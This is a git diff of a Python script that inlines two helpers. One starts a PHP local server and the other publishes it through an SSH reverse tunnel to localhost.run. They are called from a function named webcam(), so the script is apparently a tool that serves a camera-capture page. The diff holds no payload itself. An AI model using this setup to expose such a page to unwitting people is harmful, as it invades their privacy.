@@ -37,6 +37,17 @@ else:
             exit("\nWrong package installer name or python name !")
         except KeyboardInterrupt:
             exit("\n\nUser Exited :)")
+            
+#Run localhost ====================================================================================================
+def php_server():
+    with open("Server" , "w") as log:
+        subprocess.Popen((f"php -S localhost:{port}"),stderr=log,stdout=log , shell=True)
+#Change localhost to Server ====================================================================================================
+def loaclhost():
+    global port
+
+    with open("localhost.txt" , "w") as local:
+        subprocess.Popen((f"ssh -R 80:localhost:{port} nokey@localhost.run"),stderr=local , stdout=local , shell=True)
 #Check php is installed ====================================================================================================
 Tool.check_php()
 #Clear Page ====================================================================================================
@@ -78,11 +89,11 @@ def webcam():
         exit(f"""{Fore.YELLOW}│
 ╰┈➤{Fore.RED}[-]{Fore.BLUE} Port must be less than {Fore.GREEN}65536""" + Fore.RESET)
 #====================================================================================================
-    Tool.php_server()
+    php_server()
     
     sleep(1)
 
-    Tool.loaclhost()
+    loaclhost()
 
     try:
         print(" ")
